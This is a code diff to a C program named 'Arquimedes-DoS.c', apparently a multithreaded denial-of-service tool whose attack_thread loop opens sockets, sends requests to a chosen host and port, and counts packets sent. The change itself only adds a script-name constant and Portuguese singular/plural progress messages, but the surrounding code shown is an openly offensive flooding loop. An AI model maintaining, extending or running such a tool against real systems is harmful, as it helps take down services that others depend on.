@@ -7,6 +7,8 @@
 #include <netinet/in.h>
 #include <pthread.h>
 
+#define SCRIPT_NAME "Arquimedes-DoS.c"
+
 char host[256];
 int port;
 int total_packets_per_thread;
@@ -65,7 +67,12 @@ void *attack_thread(void *arg) {
         send(sock, request, strlen(request), 0);
 
         sent_packets++;
-        printf("Arquimedes DoS.c ---> %d Packtes enviados para %s porta %d\n", sent_packets, host, port);
+        if (sent_packets == 1) {
+            printf("%s -> %d pacote enviado para %s porta %d\n", SCRIPT_NAME, sent_packets, host, port);
+        } else {
+            printf("%s -> %d pacotes enviados para %s porta %d\n", SCRIPT_NAME, sent_packets, host, port);
+        }
+
         close(sock);
         usleep(100000);
     }
